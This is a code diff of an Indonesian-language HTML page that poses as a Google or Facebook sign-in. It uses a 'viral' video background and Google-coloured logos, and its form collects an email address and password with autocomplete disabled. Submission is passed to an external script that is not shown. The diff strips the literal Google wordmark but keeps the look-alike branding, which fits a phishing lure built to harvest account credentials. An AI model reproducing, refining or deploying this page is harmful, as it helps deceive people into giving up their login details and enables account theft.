@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>gunakan akun anda</title>
+    <title>Login menggunakan akun Anda</title>
 
     <style>
         * {
@@ -18,37 +18,30 @@
             overflow: hidden;
             font-family: 'Roboto', Arial, sans-serif;
             cursor: pointer;
-
             background-image: url("viral.jpg");
             background-color: #0b1020;
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        /* ===== JENDELA — MIRIP GOOGLE ===== */
         .box {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%) scale(0.95);
             z-index: 10;
-
             width: 90%;
             max-width: 400px;
             padding: 40px 32px 28px;
-
             background: #ffffff;
             border-radius: 28px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.15);
-
             text-align: center;
             color: #202124;
-
             opacity: 0;
             visibility: hidden;
             transition: all 0.25s ease;
@@ -60,7 +53,6 @@
             transform: translate(-50%, -50%) scale(1);
         }
 
-        /* Tombol tutup (X) */
         .close-btn {
             position: absolute;
             top: 16px;
@@ -70,7 +62,6 @@
             cursor: pointer;
             font-weight: 400;
             line-height: 1;
-            transition: color 0.2s;
             z-index: 3;
         }
 
@@ -78,20 +69,15 @@
             color: #202124;
         }
 
-        /* Logo Google */
+        /* Teks pengganti tulisan Google di bagian atas */
         .google-logo {
-            font-size: 32px;
-            font-weight: 700;
-            letter-spacing: -1px;
-            margin-bottom: 12px;
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: 0;
+            line-height: 1.4;
+            margin-bottom: 20px;
+            color: #202124;
         }
-
-        .google-logo span:nth-child(1) { color: #4285f4; }
-        .google-logo span:nth-child(2) { color: #ea4335; }
-        .google-logo span:nth-child(3) { color: #fbbc05; }
-        .google-logo span:nth-child(4) { color: #4285f4; }
-        .google-logo span:nth-child(5) { color: #34a853; }
-        .google-logo span:nth-child(6) { color: #ea4335; }
 
         h2 {
             margin-bottom: 8px;
@@ -106,7 +92,6 @@
             font-size: 16px;
         }
 
-        /* ===== TOMBOL PILIHAN LOGIN ===== */
         .pilihan-container {
             display: flex;
             flex-direction: column;
@@ -139,10 +124,18 @@
         .login-btn .logo {
             font-size: 20px;
             font-weight: bold;
+            display: inline-block;
         }
 
+        /* Logo Google tetap warna-warni */
         .google-g {
-            background: linear-gradient(90deg, #4285f4 0%, #4285f4 25%, #34a853 25%, #34a853 50%, #fbbc05 50%, #fbbc05 75%, #ea4335 75%);
+            background: conic-gradient(
+                from -45deg,
+                #4285F4 0deg 90deg,
+                #34A853 90deg 180deg,
+                #FBBC05 180deg 270deg,
+                #EA4335 270deg 360deg
+            );
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
@@ -177,7 +170,6 @@
             font-size: 14px;
         }
 
-        /* ===== FORM INPUT ===== */
         .input-wrapper {
             position: relative;
             margin-bottom: 12px;
@@ -199,7 +191,6 @@
         input {
             width: 100%;
             padding: 20px 14px 8px;
-            margin-bottom: 0;
             border: 1px solid #dadce0;
             border-radius: 4px;
             background: #ffffff;
@@ -238,7 +229,9 @@
             text-decoration: none;
         }
 
-        .help-link a:hover {
+        .help-link a:hover,
+        .guest-note a:hover,
+        .create-link a:hover {
             text-decoration: underline;
         }
 
@@ -254,10 +247,6 @@
             text-decoration: none;
         }
 
-        .guest-note a:hover {
-            text-decoration: underline;
-        }
-
         .bottom-links {
             display: flex;
             justify-content: space-between;
@@ -269,10 +258,6 @@
             font-size: 14px;
             font-weight: 500;
             text-decoration: none;
-        }
-
-        .create-link a:hover {
-            text-decoration: underline;
         }
 
         .btn-next {
@@ -289,7 +274,6 @@
 
         .btn-next:hover {
             background: #3367d6;
-            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
         }
 
         #loading {
@@ -311,24 +295,35 @@
                 padding: 32px 20px 24px;
                 border-radius: 24px;
             }
-            h2 { font-size: 20px; }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            .google-logo {
+                font-size: 20px;
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
         }
     </style>
 </head>
 
 <body>
 
-    <!-- PETUNJUK KLIK LAYAR -->
-    <div id="tapHint" style="position:fixed;z-index:1;color:white;font-size:18px;opacity:0.7;pointer-events:none;animation:pulse 2s infinite;">
-         
+    <div id="tapHint"
+         style="position:fixed;z-index:1;color:white;font-size:18px;opacity:0.7;pointer-events:none;animation:pulse 2s infinite;">
     </div>
 
-    <!-- KOTAK PILIHAN — GOOGLE, FACEBOOK, DAN TAMU -->
+    <!-- PILIHAN AKUN -->
     <div class="box" id="pilihanBox">
         <div class="close-btn" onclick="tutupBox(event)">&times;</div>
 
         <div class="google-logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            Login menggunakan akun Anda
         </div>
 
         <h2>Masuk</h2>
@@ -339,10 +334,12 @@
                 <span class="logo google-g">G</span>
                 Lanjutkan dengan Google
             </button>
+
             <button class="login-btn" onclick="pilihVideo('facebook')">
                 <span class="logo facebook-f">f</span>
                 Lanjutkan dengan Facebook
             </button>
+
             <button class="login-btn" onclick="masukSebagaiTamu()">
                 <span class="logo guest-icon">👤</span>
                 Masuk sebagai Tamu
@@ -353,27 +350,30 @@
             <span>atau</span>
         </div>
 
-        <p style="font-size:14px;color:#5f6368;margin-top:-8px;">Pilih salah satu akun untuk masuk</p>
+        <p style="font-size:14px;color:#5f6368;margin-top:-8px;">
+            Pilih salah satu akun untuk masuk
+        </p>
     </div>
 
-
-    <!-- FORM LOGIN -->
+    <!-- FORM -->
     <div class="box" id="formBox">
         <div class="close-btn" onclick="tutupBox(event)">&times;</div>
 
         <div class="google-logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            Login menggunakan akun Anda
         </div>
 
         <h2 id="judulForm">Login</h2>
-        <p class="subtitle" id="subJudul">Gunakan Akun Google Anda</p>
+        <p class="subtitle" id="subJudul">
+            Gunakan akun Anda untuk melanjutkan
+        </p>
 
         <div class="input-wrapper">
             <input
                 type="text"
                 id="nama"
                 placeholder="Email Address"
-                autocomplete="username"
+                autocomplete="off"
             >
             <label class="input-label">Email Address</label>
         </div>
@@ -387,43 +387,36 @@
                 type="password"
                 id="kode"
                 placeholder="Password"
-                autocomplete="current-password"
+                autocomplete="off"
             >
             <label class="input-label">Kata Sandi</label>
         </div>
 
         <div class="guest-note">
-            Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="#" onclick="return false;">Pelajari selengkapnya</a>
+            Gunakan akun yang sesuai untuk melanjutkan.
         </div>
 
         <div class="bottom-links">
             <div class="create-link">
-                <a href="#" onclick="return false;">Buat akun</a>
+                <a href="#" onclick="return false;">Bantuan</a>
             </div>
-            <button class="btn-next" onclick="masuk()">Berikutnya</button>
+
+            <button class="btn-next" onclick="masuk()">
+                Berikutnya
+            </button>
         </div>
 
         <p id="loading">Memeriksa data...</p>
         <p id="error"></p>
     </div>
 
-
-    <!-- JAVASCRIPT -->
     <script>
-        // Fungsi tombol Tamu — langsung pindah halaman tanpa ke form login
         function masukSebagaiTamu() {
-            // Ganti URL di bawah ini dengan halaman tujuan kamu
-            window.location.href = "video.html";
+            window.location.href = "Pilihvid.html";
         }
     </script>
-    <script src="javas.js"></script>
 
-    <style>
-        @keyframes pulse {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
-        }
-    </style>
+    <script src="javas.js"></script>
 
 </body>
 </html>
